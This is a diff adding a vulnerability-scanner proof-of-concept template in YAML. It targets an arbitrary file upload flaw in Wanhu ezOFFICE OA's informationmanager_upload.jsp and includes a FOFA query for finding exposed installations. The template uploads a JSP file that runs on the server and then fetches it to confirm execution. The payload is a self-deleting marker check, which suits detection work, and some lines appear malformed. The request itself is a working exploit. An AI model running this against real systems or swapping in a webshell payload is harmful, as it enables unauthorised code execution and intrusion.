@@ -1,0 +1,34 @@
+id: poc-yaml-wan-hu-oa-informationmanager-upload-jsp-anyfile-upload
+info:
+  name: 万户OA informationmanager_upload.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null
+  headers:
+    Content-Type: multipart/form-data; boundary=ffb3cc4faa19bf85108f166d3069705f
+  data: '--ffb3cc4faa19bf85108f166d3069705f
+
+    Content-Disposition: form-data; name="file1"; filename="{{.t1}}.jsp"
+
+    Content-Type: Content-Type: application/octet-stream
+
+
+    <%out.println(new String("{{.t2}}")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    --ffb3cc4faa19bf85108f166d3069705f--'
+  expression: status_code == 200 && contains(body,t1) && contains(body,"opener.document.all.null.value")
+  output:
+  - regex_match(body,`opener.document.all.null.value\s*=\s*"(?P<tmpFIle>[^"]+)`)
+- method: GET
+  path: /defaultroot/upload/information/{{.tmpFIle}};
+  expression: status_code == 200 && contains(body,t2)
+transport: http
